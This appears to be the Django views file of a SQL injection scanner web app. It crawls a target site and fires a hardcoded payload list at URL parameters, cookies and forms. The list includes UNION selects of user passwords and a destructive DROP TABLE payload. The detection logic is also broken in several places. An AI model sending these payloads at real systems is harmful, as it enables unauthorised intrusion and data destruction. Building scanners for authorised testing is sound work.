import requests
from django.shortcuts import render,redirect
from django.http import HttpResponse
from .models import ScanResult
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urlencode,urljoin
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib import messages

# Function to scan for SQL injection vulnerabilities
def scan(request):
    if request.method == 'POST':
        target_url = request.POST.get('target_url')
        deep_scan = request.POST.get('deep_scan') == 'on'
        
        # Collect endpoints via crawling if deep scan is enabled
        if deep_scan:
            endpoints = crawl_website(target_url)
        else:
            endpoints = [target_url]  # Just scan the provided URL
        
        vulnerabilities = []
        
        # Scan each endpoint for SQL injection vulnerabilities
        for endpoint in endpoints:
            vulnerabilities.extend(detect_sql_injection(endpoint))
        
        # Save scan results to the database
        for vulnerability in vulnerabilities:
            ScanResult.objects.create(
                url=vulnerability['endpoint'],
                vulnerability_type=vulnerability['type'],
                details=vulnerability['details'],
                mitigation=vulnerability['mitigation'],
                payload=vulnerability.get('payload', None)  # Include payload if available
            )

        return HttpResponse("Scan completed. Check scan results.")
    return render(request, 'scan.html')


# Function to detect SQL injection vulnerabilities
def detect_sql_injection(url):
    vulnerabilities = []
    try:
        # Analyze URL parameters
        vulnerabilities.extend(analyze_url_parameters(url))

        # Analyze headers
        vulnerabilities.extend(analyze_headers(url))

        # Analyze cookies
        vulnerabilities.extend(analyze_cookies(url))

        # Analyze HTML forms
        vulnerabilities.extend(analyze_forms(url))

    except Exception as e:
        print("Error occurred:", e)
    return vulnerabilities

# Function to analyze URL parameters for SQL injection
def analyze_url_parameters(url):
    vulnerabilities = []
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    
    for param in query_params:
        if '=' in param:
            param_name, param_value = param.split('=')
            fuzzed_params = fuzz_parameters(param_value)
            for fuzzed_param in fuzzed_params:
                test_url = url.replace(param_value, fuzzed_param)
                if check_injection(test_url):
                    vulnerabilities.append({
                        'endpoint': url,
                        'type': "SQL Injection in URL parameter",
                        'details': f"Parameter: {param_name}, Payload: {fuzzed_param}",
                        'mitigation': "Use parameterized queries or input validation to sanitize user input.",
                        'payload': fuzzed_param  # Include payload
                    })
        else:
            # Handle parameters without values
            fuzzed_params = fuzz_parameters(param)
            for fuzzed_param in fuzzed_params:
                test_url = url.replace(param, fuzzed_param)
                if check_injection(test_url):
                    vulnerabilities.append({
                        'endpoint': url,
                        'type': "SQL Injection in URL parameter",
                        'details': f"Parameter: {param}, Payload: {fuzzed_param}",
                        'mitigation': "Use parameterized queries or input validation to sanitize user input.",
                        'payload': fuzzed_param  # Include payload
                    })
    
    return vulnerabilities


# Function to analyze headers for SQL injection
def analyze_headers(url):
    vulnerabilities = []
    try:
        response = requests.head(url)
        response_headers = response.headers

        for header_name, header_value in response_headers.items():
            if contains_sql_keywords(header_value):
                vulnerabilities.append({
                    'endpoint': url,
                    'type': "SQL Injection in header",
                    'details': f"Header: {header_name}, Value: {header_value}",
                    'mitigation': "Ensure proper input validation and sanitization.",
                    'payload': header_value  # Include payload
                })

    except Exception as e:
        print("Error occurred during header analysis:", e)
    
    return vulnerabilities

# Function to analyze cookies for SQL injection
def analyze_cookies(url):
    vulnerabilities = []
    try:
        response = requests.get(url)
        cookies = response.cookies

        for cookie in cookies:
            # Check if the cookie value exhibits behavior indicative of Blind SQL Injection
            if is_blind_sql_injection(url, cookie.name, cookie.value):
                vulnerabilities.append({
                    'endpoint': url,
                    'type': "Blind SQL Injection in cookie",
                    'details': f"Cookie: {cookie.name}, Value: {cookie.value}",
                    'mitigation': "Ensure proper input validation and sanitization.",
                    'payload': cookie.value  # Include payload
                })

    except Exception as e:
        print("Error occurred during cookie analysis:", e)
    
    return vulnerabilities

# Function to check if the cookie value exhibits behavior indicative of Blind SQL Injection
def is_blind_sql_injection(url, cookie_name, cookie_value):
    try:
        # Example pattern to detect Blind SQL Injection (modify as needed based on application behavior)
        # For example, if the application takes longer to respond for certain payloads, that could indicate a Blind SQL Injection vulnerability
        payload = "' OR SLEEP(5) --"
        injected_cookie = cookie_value.replace("{payload}", payload)
        response_with_injection = requests.get(url, cookies={cookie_name: injected_cookie})
        response_without_injection = requests.get(url, cookies={cookie_name: cookie_value})
        return response_with_injection.elapsed.total_seconds() > response_without_injection.elapsed.total_seconds()
    except Exception as e:
        print("Error occurred during Blind SQL Injection check:", e)
        return False

# Function to analyze HTML forms for SQL injection, including login forms
def analyze_forms(url):
    vulnerabilities = []
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_url = form.get('action')
            form_method = form.get('method')
            form_inputs = form.find_all('input')
            
            params = {}
            for input_tag in form_inputs:
                input_name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')
                if input_name and input_type != 'submit':
                    params[input_name] = fuzz_parameters(input_name)
                    
            # Check if it's a login form
            if is_login_form(form):
                for param, payloads in params.items():
                    for payload in payloads:
                        # Construct the login request with the fuzzed parameter
                        login_data = {param: payload}
                        login_response = requests.post(form_url, data=login_data)
                        if 'error' in login_response.text.lower():
                            vulnerabilities.append({
                                'endpoint': url,
                                'type': "SQL Injection in login form",
                                'details': f"Parameter: {param}, Payload: {payload}",
                                'mitigation': "Use parameterized queries or input validation to sanitize user input.",
                                'payload': payload  # Include payload
                            })
            else:
                # Analyze other forms normally
                if form_method == 'get':
                    for param, payloads in params.items():
                        for payload in payloads:
                            new_url = f"{form_url}?{param}={payload}"
                            if check_injection(new_url):
                                vulnerabilities.append({
                                    'endpoint': url,
                                    'type': "SQL Injection in form (GET)",
                                    'details': f"Parameter: {param}, Payload: {payload}",
                                    'mitigation': "Use parameterized queries or input validation to sanitize user input.",
                                    'payload': payload  # Include payload
                                })
                elif form_method == 'post':
                    for param, payloads in params.items():
                        for payload in payloads:
                            data = {param: payload}
                            if check_injection(form_url, data=data):
                                vulnerabilities.append({
                                    'endpoint': url,
                                    'type': "SQL Injection in form (POST)",
                                    'details': f"Parameter: {param}, Payload: {payload}",
                                    'mitigation': "Use parameterized queries or input validation to sanitize user input.",
                                    'payload': payload  # Include payload
                                })
                        
    except Exception as e:
        print("Error occurred during form analysis:", e)
    
    return vulnerabilities

# Function to check if a form is a login form
def is_login_form(form):
    # Example: Check if form contains input fields for username and password
    username_input = form.find('input', {'name': 'username'})
    password_input = form.find('input', {'name': 'password'})
    return username_input is not None and password_input is not None

# Function to check for SQL injection
def check_injection(url, data=None):
    try:
        response = requests.get(url, data=data)
        if 'error' in response.text.lower():
            return True
    except Exception as e:
        pass
    return False

# Function to fuzz parameters
def fuzz_parameters(param_value):
    payloads = [
        "' OR 1=1 --",
        "' OR '1'='1' --",
        "' OR 1=1 /*",
        "' OR '1'='1' /*",
        "1'; DROP TABLE users; --",
        "1 AND 1=1",
        "1 AND 1=2",
        "1 OR 1=1",
        "1 OR 1=2",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' OR 1=1",
        "' OR 1=2",
        "' AND 1=1",
        "' AND 1=2",
        "1; SELECT * FROM users;",
        "1 UNION SELECT 1,2,3 FROM users;",
        "1; SELECT password FROM users;",
        "1 UNION SELECT 1,username,password FROM users;",
    ]
    fuzzed_params = []
    for payload in payloads:
        fuzzed_param = urlencode({param_value: payload})
        fuzzed_params.append(fuzzed_param)
    return fuzzed_params

# Function to check if the string contains SQL keywords
def contains_sql_keywords(s):
    sql_keywords = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'UNION', 'FROM', 'WHERE', 'JOIN', 'OR', 'AND']
    for keyword in sql_keywords:
        if keyword in s.upper():
            return True
    return False



# Function to crawl the website and collect endpoints
def crawl_website(url, visited=None):
    if visited is None:
        visited = set()
    endpoints = set()
    
    # Avoid visiting the same URL multiple times
    if url in visited:
        return endpoints
    
    visited.add(url)
    
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link.get('href')
                absolute_url = urljoin(url, href)
                if absolute_url.startswith(url):  # Only consider internal links
                    endpoints.add(absolute_url)
                    endpoints.update(crawl_website(absolute_url, visited))
    except Exception as e:
        print(f"Error occurred while crawling {url}: {e}")
    
    return endpoints

#todo add 2FA multifactor authentication
def user_login(request):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return redirect('scan')
        else:
            messages.error(request, 'Invalid username or password.')
    return render(request, 'login.html')

def user_logout(request):
    logout(request)
    return redirect('login')

def register(request):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        email = request.POST['email']
        if User.objects.filter(username=username).exists():
            messages.error(request, 'Username is already taken.')
        else:
            user = User.objects.create_user(username=username, email=email, password=password)
            login(request, user)
            return redirect('scan')
    return render(request, 'register.html')



